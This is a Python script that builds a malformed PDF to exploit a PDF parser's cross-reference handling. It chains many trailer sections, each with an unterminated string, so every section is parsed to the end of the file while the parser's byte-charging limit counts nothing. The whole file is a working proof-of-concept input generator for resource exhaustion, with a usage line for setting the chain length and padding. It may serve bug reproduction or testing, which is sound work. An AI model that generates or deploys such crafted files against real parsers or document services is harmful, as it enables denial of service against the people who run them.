# K older classic sections, each "xref 0 0 trailer << /Size 6 /Prev next /Pad (" with an
# unterminated string: every section's parse reads to the end of the file (P pad bytes plus the
# main section). The parser then sits at end of input, Lexer::getPos() is -1, and
# chargeChainBytes charges nothing. usage: prevstr.py K P out.pdf
import sys
K, P, out_path = int(sys.argv[1]), int(sys.argv[2]), sys.argv[3]
content = b"BT /F1 24 Tf 72 700 Td [<5265636f7264> 0 <20717561727465>] TJ ET"
objs = {1: b"<< /Type /Catalog /Pages 2 0 R >>", 2: b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
        3: b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R /Resources << /Font << /F1 5 0 R >> >> >>",
        4: b"<< /Length %d >>\nstream\n" % len(content) + content + b"\nendstream",
        5: b"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>"}
out = bytearray(b"%PDF-1.4\n%\xe2\xe3\xcf\xd3\n"); off = {}
for n in sorted(objs):
    off[n] = len(out); out += b"%d 0 obj\n" % n + objs[n] + b"\nendobj\n"
L = len(b"xref\n0 0\ntrailer\n<< /Size 6 /Prev 0000000000 /Pad (\n")
base = len(out)
pos = [base + i * L for i in range(K)]
for i in range(K):
    nxt = b" /Prev %010d" % pos[i + 1] if i + 1 < K else b" /Prv 0000000000"
    out += b"xref\n0 0\ntrailer\n<< /Size 6" + nxt + b" /Pad (\n"
out += b"x" * P + b"\n"
xat = len(out)
out += b"xref\n0 6\n0000000000 65535 f \n" + b"".join(b"%010d 00000 n \n" % off[n] for n in range(1, 6))
out += b"trailer\n<< /Size 6 /Root 1 0 R /Prev %d >>\nstartxref\n%d\n%%%%EOF\n" % (pos[0], xat)
open(out_path, "wb").write(out)
